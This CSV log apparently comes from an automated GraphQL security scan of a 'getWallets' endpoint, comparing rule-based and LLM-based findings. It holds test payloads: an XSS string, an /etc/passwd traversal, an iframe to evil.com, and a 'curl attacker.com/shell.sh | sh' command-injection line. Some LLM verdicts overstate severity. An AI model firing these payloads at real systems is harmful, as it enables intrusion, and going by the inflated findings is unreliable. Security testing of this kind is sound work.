timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-06T19:03:45.792597,getWallets_response_2,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T19:03:54.120224,getWallets_response_3,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The server returned a 400 error containing the unescaped XSS payload '<img src=x onerror=alert(1)>' in its error message. This indicates the server reflects user-supplied input directly in its responses without proper sanitization. While the payload triggered a GraphQL syntax error (not executed in this response context), the reflection of raw HTML/JavaScript in error messages creates a potential XSS vector if this error output is rendered unsafely in a client interface (e.g., web UI displaying GraphQL errors). The payload matches a common XSS test pattern, demonstrating input reflection."", ""evidence"": ""Reflected XSS payload '<img src=x onerror=alert(1)>' in GraphQL error message"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""Reflected XSS payload '<img src=x onerror=alert(1)>' in GraphQL error message"", ""explanation"": ""The server returned a 400 error containing the unescaped XSS payload '<img src=x onerror=alert(1)>' in its error message. This indicates the server reflects user-supplied input directly in its responses without proper sanitization. While the payload triggered a GraphQL syntax error (not executed in this response context), the reflection of raw HTML/JavaScript in error messages creates a potential XSS vector if this error output is rendered unsafely in a client interface (e.g., web UI displaying GraphQL errors). The payload matches a common XSS test pattern, demonstrating input reflection.""}}]"
2025-10-06T19:03:58.732390,getWallets_response_4,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T19:04:31.554599,getWallets_response_5,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The error message explicitly contains an attempted shell command injection payload (`curl https://attacker.com/shell.sh | sh`) in the GraphQL parsing phase. This indicates unvalidated/unscrubbed user input reaching the GraphQL processor, strongly suggesting potential OS command injection vulnerability. While the server rejected this particular attempt due to a syntax error (incorrect GraphQL structure), the presence of raw shell operators (`|`) and attacker-controlled URLs in the error trace demonstrates attacker probing and a failure to sanitize user input before potential backend processing."", ""evidence"": ""Syntax Error: Expected Name, found String \""| curl https://attacker.com/shell.sh | sh\""."", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""Syntax Error: Expected Name, found String \""| curl https://attacker.com/shell.sh | sh\""."", ""explanation"": ""The error message explicitly contains an attempted shell command injection payload (`curl https://attacker.com/shell.sh | sh`) in the GraphQL parsing phase. This indicates unvalidated/unscrubbed user input reaching the GraphQL processor, strongly suggesting potential OS command injection vulnerability. While the server rejected this particular attempt due to a syntax error (incorrect GraphQL structure), the presence of raw shell operators (`|`) and attacker-controlled URLs in the error trace demonstrates attacker probing and a failure to sanitize user input before potential backend processing.""}}]"
2025-10-06T19:04:43.809252,getWallets_response_6,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: path_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The error message explicitly references a path traversal payload (\""../../../etc/passwd\"") in a GraphQL parsing context. While the server rejected the query due to a syntax error (string instead of expected name), the presence of this payload indicates an attempted path injection attack targeting file system access. The error suggests the payload was injected into the query structure (e.g., field names or arguments), though it failed due to improper syntax formatting. This demonstrates attacker intent and potential exposure of path manipulation vectors, though full exploitation was prevented by syntax validation."", ""evidence"": ""Syntax Error: Expected Name, found String \""../../../etc/passwd\""."", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.7, ""evidence"": ""Syntax Error: Expected Name, found String \""../../../etc/passwd\""."", ""explanation"": ""The error message explicitly references a path traversal payload (\""../../../etc/passwd\"") in a GraphQL parsing context. While the server rejected the query due to a syntax error (string instead of expected name), the presence of this payload indicates an attempted path injection attack targeting file system access. The error suggests the payload was injected into the query structure (e.g., field names or arguments), though it failed due to improper syntax formatting. This demonstrates attacker intent and potential exposure of path manipulation vectors, though full exploitation was prevented by syntax validation.""}}]"
2025-10-06T19:06:40.455616,getWallets_response_7,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL error message reflects unsanitized user input containing HTML tags (<h1> and <iframe>). While the response is JSON-formatted, this input reflection creates a potential HTML injection vector if the client application renders error messages without proper escaping. This could enable Cross-Site Scripting (XSS) attacks, depending on client-side handling. The server should sanitize user input in error messages to mitigate this risk."", ""evidence"": ""Error message contains user-supplied HTML: \""<h1>Hacked</h1><iframe src='evil.com'>\"""", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.7, ""evidence"": ""Error message contains user-supplied HTML: \""<h1>Hacked</h1><iframe src='evil.com'>\"""", ""explanation"": ""The GraphQL error message reflects unsanitized user input containing HTML tags (<h1> and <iframe>). While the response is JSON-formatted, this input reflection creates a potential HTML injection vector if the client application renders error messages without proper escaping. This could enable Cross-Site Scripting (XSS) attacks, depending on client-side handling. The server should sanitize user input in error messages to mitigate this risk.""}}]"
2025-10-06T19:07:23.924195,getWallets_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T19:08:04.794312,getWallets_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T19:08:19.692131,getWallets_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T19:08:28.094385,getWallets_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response explicitly discloses valid schema field names via typo correction suggestions in error messages. This exposes internal schema details (field names like 'name', 'currency', and 'balance'), enabling attackers to probe and reconstruct the schema. While not a direct exploit, it aids reconnaissance and increases the risk of further attacks by revealing hidden fields or functionality."", ""evidence"": ""Error messages suggest valid fields ('name', 'currency', 'balance') when typos ('nname', 'currencie', 'balanc3') are submitted"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""Error messages suggest valid fields ('name', 'currency', 'balance') when typos ('nname', 'currencie', 'balanc3') are submitted"", ""explanation"": ""The GraphQL response explicitly discloses valid schema field names via typo correction suggestions in error messages. This exposes internal schema details (field names like 'name', 'currency', and 'balance'), enabling attackers to probe and reconstruct the schema. While not a direct exploit, it aids reconnaissance and increases the risk of further attacks by revealing hidden fields or functionality.""}}]"
